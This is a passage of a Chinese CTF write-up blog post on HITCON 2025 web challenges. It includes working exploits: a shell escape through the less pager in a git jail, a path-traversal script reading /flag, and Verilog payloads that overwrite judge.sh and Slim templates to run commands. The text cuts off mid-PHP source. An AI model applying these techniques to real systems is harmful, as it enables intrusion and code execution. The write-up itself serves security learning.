<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>HITCON-2025 | cheng_xing's blog</title><meta name="author" content="cheng_xing"><meta name="copyright" content="cheng_xing"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="git-playground一个基于 C++ 编写的受限 Shell 环境。可以在一个被 chroot 隔离的 &#x2F;work 目录中执行一小部分被白名单化的 Linux 命令。黑名单机制禁止了 sh, env 等命令的直接执行。需要绕过这些限制，读取存放在环境变量中的 FLAG jail.cpp 通过一系列机制来限制用户行为：  路径限制：chdir(&quot;&#x2F;work&quot;) 和 che">
<meta property="og:type" content="article">
<meta property="og:title" content="HITCON-2025">
<meta property="og:url" content="https://sakuraraindrop.github.io/2025/08/24/HITCON-2025/index.html">
<meta property="og:site_name" content="cheng_xing&#39;s blog">
<meta property="og:description" content="git-playground一个基于 C++ 编写的受限 Shell 环境。可以在一个被 chroot 隔离的 &#x2F;work 目录中执行一小部分被白名单化的 Linux 命令。黑名单机制禁止了 sh, env 等命令的直接执行。需要绕过这些限制，读取存放在环境变量中的 FLAG jail.cpp 通过一系列机制来限制用户行为：  路径限制：chdir(&quot;&#x2F;work&quot;) 和 che">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://sakuraraindrop.github.io/img/ltx.jpg">
<meta property="article:published_time" content="2025-08-24T15:17:38.000Z">
<meta property="article:modified_time" content="2025-09-30T11:03:19.256Z">
<meta property="article:author" content="cheng_xing">
<meta property="article:tag" content="pyjail">
<meta property="article:tag" content="os.path.join">
<meta property="article:tag" content="git命令执行">
<meta property="article:tag" content="verilog命令执行">
<meta property="article:tag" content="slim模板">
<meta property="article:tag" content="tcp自连接">
<meta property="article:tag" content="pickle反序列化(with image)">
<meta property="article:tag" content="multiprocessing进程间通信管道污染">
<meta property="article:tag" content="sqlite">
<meta property="article:tag" content="php jail">
<meta property="article:tag" content="laravel">
<meta property="article:tag" content="wordpress">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://sakuraraindrop.github.io/img/ltx.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "HITCON-2025",
  "url": "https://sakuraraindrop.github.io/2025/08/24/HITCON-2025/",
  "image": "https://sakuraraindrop.github.io/img/ltx.jpg",
  "datePublished": "2025-08-24T15:17:38.000Z",
  "dateModified": "2025-09-30T11:03:19.256Z",
  "author": [
    {
      "@type": "Person",
      "name": "cheng_xing",
      "url": "https://sakuraraindrop.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/ltx-icon.jpg"><link rel="canonical" href="https://sakuraraindrop.github.io/2025/08/24/HITCON-2025/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'HITCON-2025',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/hk.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/ltx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">61</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">147</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/hk.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/ltx-icon.jpg" alt="Logo"><span class="site-name">cheng_xing's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">HITCON-2025</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">HITCON-2025</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-08-24T15:17:38.000Z" title="发表于 2025-08-24 23:17:38">2025-08-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-09-30T11:03:19.256Z" title="更新于 2025-09-30 19:03:19">2025-09-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/2025%E7%BA%BF%E4%B8%8A%E8%B5%9B/">2025线上赛</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="git-playground"><a href="#git-playground" class="headerlink" title="git-playground"></a>git-playground</h2><p>一个基于 C++ 编写的受限 Shell 环境。可以在一个被 <code>chroot</code> 隔离的 <code>/work</code> 目录中执行一小部分被白名单化的 Linux 命令。黑名单机制禁止了 <code>sh</code>, <code>env</code> 等命令的直接执行。需要绕过这些限制，读取存放在环境变量中的 FLAG</p>
<p><code>jail.cpp</code> 通过一系列机制来限制用户行为：</p>
<ul>
<li><strong>路径限制</strong>：<code>chdir(&quot;/work&quot;)</code> 和 <code>check_path_under_work()</code> 函数确保了所有文件操作都无法逃逸出 <code>/work</code> 目录。</li>
<li><strong>命令黑名单</strong>：<code>blacklist()</code> 函数通过简单的字符串匹配，禁止用户输入任何包含 <code>sh</code>, <code>env</code>, <code>hook</code> 的命令。</li>
<li><strong>命令白名单与参数校验</strong>：<code>check()</code> 函数定义了允许执行的命令及其参数格式。只有完全符合白名单规则的命令才会被 <code>execvp</code> 执行。</li>
</ul>
<p>攻击思路：</p>
<ol>
<li><code>git log</code>, <code>git diff</code> 等命令在输出内容很长时，会调用一个外部的分页器程序（通常是 <code>less</code>）来方便用户浏览。</li>
<li><code>less</code> 程序本身是一个功能强大的交互式应用。在 <code>less</code> 的界面中，用户可以输入 <code>!</code> 紧跟一个命令，<code>less</code> 会执行这个命令并显示其输出。</li>
<li><code>jail.cpp</code> 程序的黑名单只检查我们提交给它的第一层命令（如 <code>git log</code>）。一旦 <code>git log</code> 启动了 <code>less</code>，我们在 <code>less</code> 内部输入的任何命令都不会经过程序的黑名单检查。</li>
</ol>
<p>payload：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">touch file1.<span class="property">txt</span></span><br><span class="line">git add file1.<span class="property">txt</span></span><br><span class="line">git commit -m <span class="string">&quot;First commit&quot;</span></span><br><span class="line"></span><br><span class="line">touch file2.<span class="property">txt</span></span><br><span class="line">git add file2.<span class="property">txt</span></span><br><span class="line">git commit -m <span class="string">&quot;Second commit&quot;</span></span><br><span class="line"></span><br><span class="line">touch file3.<span class="property">txt</span></span><br><span class="line">git add file3.<span class="property">txt</span></span><br><span class="line">git commit -m <span class="string">&quot;Third commit&quot;</span></span><br><span class="line"></span><br><span class="line">git log</span><br><span class="line"></span><br><span class="line">!echo $FLAG</span><br><span class="line"></span><br><span class="line">hitcon&#123;<span class="title class_">Bu5</span>yb0X_34511y_cR4sH_Wh3N_bu117_w17h_C14Ng?&#125;</span><br></pre></td></tr></table></figure>

<h2 id="simple-drive"><a href="#simple-drive" class="headerlink" title="simple-drive"></a>simple-drive</h2><p>有个simple-drive-revenge，那么这题应该是有非预期的</p>
<p>diff一下发现了一个关键函数有被修改过</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">simple-drive/src/fs.py</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">path</span>(<span class="params">self, path</span>):</span><br><span class="line">    <span class="keyword">return</span> os.path.join(<span class="variable language_">self</span>.rootdir.name, os.path.normpath(os.path.join(<span class="string">&#x27;/&#x27;</span>, path))[<span class="number">1</span>:])</span><br><span class="line"></span><br><span class="line">simple-drive-revenge/src/fs.py</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">path</span>(<span class="params">self, path</span>):</span><br><span class="line">    <span class="keyword">return</span> os.path.join(<span class="variable language_">self</span>.rootdir.name, os.path.normpath(os.path.join(<span class="string">&#x27;/&#x27;</span>, path)).lstrip(<span class="string">&#x27;/&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>原本的path函数相当于只去除了开头的一个&#x2F;，而修改后的则是去除了所有&#x2F;，这就导致再simple-drive中可以利用os.path.join的特性直接读取&#x2F;flag</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">os.<span class="property">path</span>.<span class="property">join</span>，它忽略了绝对路径之前的所有内容：</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; os.<span class="property">path</span>.<span class="title function_">join</span>(<span class="string">&#x27;/tmp/abc&#x27;</span>, <span class="string">&#x27;test.txt&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;/tmp/abc/test.txt&#x27;</span></span><br><span class="line">&gt;&gt;&gt; os.<span class="property">path</span>.<span class="title function_">join</span>(<span class="string">&#x27;/tmp/abc&#x27;</span>, <span class="string">&#x27;/test.txt&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;/test.txt&#x27;</span></span><br></pre></td></tr></table></figure>

<p>因此传&#x2F;read?path&#x3D;&#x2F;&#x2F;flag直接就能读到flag</p>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://simple-drive.chal.hitconctf.com:54528&#x27;</span></span><br><span class="line"></span><br><span class="line">USERNAME = <span class="string">&#x27;pwn&#x27;</span></span><br><span class="line">PASSWORD = <span class="string">&#x27;pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    r = s.post(url + <span class="string">&#x27;/register&#x27;</span>, data=&#123;<span class="string">&#x27;username&#x27;</span>: USERNAME, <span class="string">&#x27;password&#x27;</span>: PASSWORD&#125;)</span><br><span class="line">    <span class="built_in">print</span>(r.status_code, r.text)</span><br><span class="line">    r = s.post(url + <span class="string">&#x27;/login&#x27;</span>, data=&#123;<span class="string">&#x27;username&#x27;</span>: USERNAME, <span class="string">&#x27;password&#x27;</span>: PASSWORD&#125;)</span><br><span class="line">    <span class="built_in">print</span>(r.status_code, r.text, r.headers)</span><br><span class="line">    r = s.get(url + <span class="string">&#x27;/read?path=//flag&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r.status_code, r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure>

<p>flag<code>hitcon&#123;S7r4Ng3_z1P_f0rM4t_w17H_p0Or_S1gn47uR3_1sn7_17&#125;</code></p>
<h2 id="Verilog-OJ"><a href="#Verilog-OJ" class="headerlink" title="Verilog OJ"></a>Verilog OJ</h2><p>题目给出的附件本身应该没有太多值得关注的点</p>
<p>实现了一个verilog语言的OJ，给出的例题可以通过提交例如下面这样的代码来AC</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">module Crossbar_2x2_4bit (</span><br><span class="line">    <span class="built_in">input</span>  [<span class="number">3</span>:<span class="number">0</span>] in1, in2,</span><br><span class="line">    <span class="built_in">input</span>        control,</span><br><span class="line">    output [<span class="number">3</span>:<span class="number">0</span>] out1, out2</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">    assign out1 = (control) ? in1 : in2;</span><br><span class="line">    assign out2 = (control) ? in2 : in1;</span><br><span class="line"></span><br><span class="line">endmodule</span><br></pre></td></tr></table></figure>

<p>重点是要想办法执行系统命令来获取&#x2F;flag的内容</p>
<p>起初尝试了使用 <code>$system</code></p>
<figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">initial</span> <span class="keyword">begin</span></span><br><span class="line">    <span class="built_in">$system</span>(<span class="string">&quot;/readflag give me the flag &gt; /app/app/presentation/public/flag.txt&quot;</span>);</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>失败，看到其它师傅博客里有本地调试过，会有如下报错</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">module.v:12: Error: System task/function $system() is not defined by any module.</span><br></pre></td></tr></table></figure>
<p>这是因为Icarus Verilog 默认禁用了 <code>$system</code> 函数，无法直接执行系统命令。</p>
<p>之后尝试通过 <code>$fopen</code> 覆盖 Slim 模板文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">integer fd;</span><br><span class="line">initial begin</span><br><span class="line">    fd = $fopen(&quot;/app/app/presentation/views/submissions.slim&quot;, &quot;w&quot;);</span><br><span class="line">    if (fd) begin</span><br><span class="line">        $fdisplay(fd, &quot;= %x&#123;/readflag give me the flag&#125;&quot;);</span><br><span class="line">        $fclose(fd);</span><br><span class="line">    end</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>这种方法部分时候会成功但不稳定，这是因为生产环境可能缓存模板，且需要额外的页面访问触发。</p>
<p>最后想到可以直接覆盖judge.sh，把想要执行的命令写进去<br>可以通过 <code>$fopen</code> 或者 <code>$fwrite</code> 覆盖 <code>/app/scripts/judge.sh</code></p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">module Crossbar_2x2_4bit(</span><br><span class="line">    input [3:0] in1, </span><br><span class="line">    input [3:0] in2, </span><br><span class="line">    input control, </span><br><span class="line">    output reg [3:0] out1, </span><br><span class="line">    output reg [3:0] out2</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">integer judge_script;</span><br><span class="line"></span><br><span class="line">initial begin</span><br><span class="line">    judge_script = $fopen(&quot;/app/scripts/judge.sh&quot;, &quot;w&quot;);</span><br><span class="line">    if (judge_script) begin</span><br><span class="line">        $fwrite(judge_script, &quot;#!/bin/sh\n\n&quot;);</span><br><span class="line">        $fwrite(judge_script, &quot;set -e\n\n&quot;);</span><br><span class="line">        $fwrite(judge_script, &quot;cd / &amp;&amp; ./readflag give me the flag &gt; /app/app/presentation/public/flag.txt 2&gt;&amp;1\n\n&quot;);</span><br><span class="line">        $fwrite(judge_script, &quot;cd \&quot;$1\&quot;\n&quot;);</span><br><span class="line">        $fwrite(judge_script, &quot;iverilog module.v testbench.v -o judge\n&quot;);</span><br><span class="line">        $fwrite(judge_script, &quot;vvp judge\n&quot;);</span><br><span class="line">        $fclose(judge_script);</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">always @(*) begin</span><br><span class="line">    case (control)</span><br><span class="line">        1&#x27;b0: begin</span><br><span class="line">            out1 = in2;</span><br><span class="line">            out2 = in1;</span><br><span class="line">        end</span><br><span class="line">        1&#x27;b1: begin</span><br><span class="line">            out1 = in1;</span><br><span class="line">            out2 = in2;</span><br><span class="line">        end</span><br><span class="line">    endcase</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">endmodule</span><br></pre></td></tr></table></figure>
<p>之后再随便提交一次，等待judge.sh重新触发，写入flag.txt，最后由于&#x2F;app&#x2F;app&#x2F;presentation&#x2F;public下的文件可以直接访问，所以直接访问flag.txt即可<br><img src="/2025/08/24/HITCON-2025/2.png" alt="alt text"></p>
<p><code>$fopen</code> 的写法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">integer fd;</span><br><span class="line">initial begin</span><br><span class="line">    fd = $fopen(&quot;/app/scripts/judge.sh&quot;, &quot;w&quot;);</span><br><span class="line">    if (fd) begin</span><br><span class="line">        $fdisplay(fd, &quot;#!/bin/sh&quot;);</span><br><span class="line">        $fdisplay(fd, &quot;set -e&quot;);</span><br><span class="line">        $fdisplay(fd, &quot;/readflag give me the flag &gt; /app/app/presentation/public/flag.txt&quot;);</span><br><span class="line">        $fdisplay(fd, &quot;cd \&quot;$1\&quot;&quot;);</span><br><span class="line">        $fdisplay(fd, &quot;iverilog module.v testbench.v -o judge&quot;);</span><br><span class="line">        $fdisplay(fd, &quot;vvp judge&quot;);</span><br><span class="line">        $fclose(fd);</span><br><span class="line">    end</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>又看到一个师傅覆盖slim模板的做法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">module Crossbar_2x2_4bit(</span><br><span class="line">  input  [3:0] in1, in2,</span><br><span class="line">  input        control,</span><br><span class="line">  output [3:0] out1, out2</span><br><span class="line">);</span><br><span class="line">  assign out1 = control ? in1 : in2;</span><br><span class="line">  assign out2 = control ? in2 : in1;</span><br><span class="line"></span><br><span class="line">  integer fd;</span><br><span class="line">  initial begin</span><br><span class="line">    fd = $fopen(&quot;/app/app/presentation/public/marker.txt&quot;, &quot;w&quot;);</span><br><span class="line">    $fdisplay(fd, &quot;marker ok&quot;);</span><br><span class="line">    $fclose(fd);</span><br><span class="line"></span><br><span class="line">    fd = $fopen(&quot;/app/app/presentation/views/submission.slim&quot;, &quot;w&quot;);</span><br><span class="line">    $fdisplay(fd, &quot;h1 PWN submission&quot;);</span><br><span class="line">    $fdisplay(fd, &quot;pre&quot;);</span><br><span class="line">    $fdisplay(fd, &quot;  = `/readflag give me the flag`&quot;);</span><br><span class="line">    $fclose(fd);</span><br><span class="line"></span><br><span class="line">    fd = $fopen(&quot;/app/app/presentation/views/problems.slim&quot;, &quot;w&quot;);</span><br><span class="line">    $fdisplay(fd, &quot;h1 PWN problems&quot;);</span><br><span class="line">    $fdisplay(fd, &quot;pre&quot;);</span><br><span class="line">    $fdisplay(fd, &quot;  = `/readflag give me the flag`&quot;);</span><br><span class="line">    $fclose(fd);</span><br><span class="line"></span><br><span class="line">    fd = $fopen(&quot;/app/app/presentation/views/problem.slim&quot;, &quot;w&quot;);</span><br><span class="line">    $fdisplay(fd, &quot;h1 PWN problem&quot;);</span><br><span class="line">    $fdisplay(fd, &quot;pre&quot;);</span><br><span class="line">    $fdisplay(fd, &quot;  = `/readflag give me the flag`&quot;);</span><br><span class="line">    $fclose(fd);</span><br><span class="line"></span><br><span class="line">    fd = $fopen(&quot;/app/app/presentation/views/submissions.slim&quot;, &quot;w&quot;);</span><br><span class="line">    $fdisplay(fd, &quot;h1 PWN submissions&quot;);</span><br><span class="line">    $fdisplay(fd, &quot;pre&quot;);</span><br><span class="line">    $fdisplay(fd, &quot;  = `/readflag give me the flag`&quot;);</span><br><span class="line">    $fclose(fd);</span><br><span class="line"></span><br><span class="line">    $display(&quot;Passed&quot;);</span><br><span class="line">    $finish;</span><br><span class="line">  end</span><br><span class="line">endmodule</span><br></pre></td></tr></table></figure>

<h2 id="No-Man’s-Echo"><a href="#No-Man’s-Echo" class="headerlink" title="No Man’s Echo"></a>No Man’s Echo</h2><p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$probe</span> = (<span class="keyword">int</span>)@<span class="variable">$_GET</span>[<span class="string">&#x27;probe&#x27;</span>];</span><br><span class="line">	<span class="variable">$range</span> = <span class="title function_ invoke__">range</span>(<span class="variable">$probe</span>, <span class="variable">$probe</span> + <span class="number">42</span>);</span><br><span class="line">	<span class="title function_ invoke__">shuffle</span>(<span class="variable">$range</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">foreach</span> (<span class="variable">$range</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$port</span>) &#123;</span><br><span class="line">		<span class="variable">$target</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;tcp://%s:%d&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_ADDR&#x27;</span>], <span class="variable">$port</span>);</span><br><span class="line">		<span class="variable">$fp</span> = @<span class="title function_ invoke__">stream_socket_client</span>(<span class="variable">$target</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">1</span>);  <span class="comment">//使用stream_socket_client()尝试连接到该端口</span></span><br><span class="line">	    <span class="keyword">if</span> (!<span class="variable">$fp</span>) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">	    <span class="title function_ invoke__">stream_set_timeout</span>(<span 